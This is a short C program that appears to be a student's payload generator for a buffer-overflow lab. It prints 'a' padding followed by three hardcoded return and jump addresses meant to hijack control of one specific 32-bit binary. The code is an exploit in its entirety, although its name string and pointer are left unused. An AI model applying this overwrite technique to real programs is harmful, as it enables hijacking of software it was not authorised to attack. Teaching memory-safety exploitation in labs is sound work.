#include <stdio.h>
#include <string.h>

char attackString[] = "Elmo Alexander\n";

int main() {
    int i;
    char *p = attackString;

    for (i = 0; i < 72 - sizeof(attackString); i++) {
        putchar('a');
    }
    printf("\x28\xde\xff\xff");
    printf("\xd5\x85\x04\x08");
    printf("\x80\xa0\x04\x08");
    
    return 1;
}
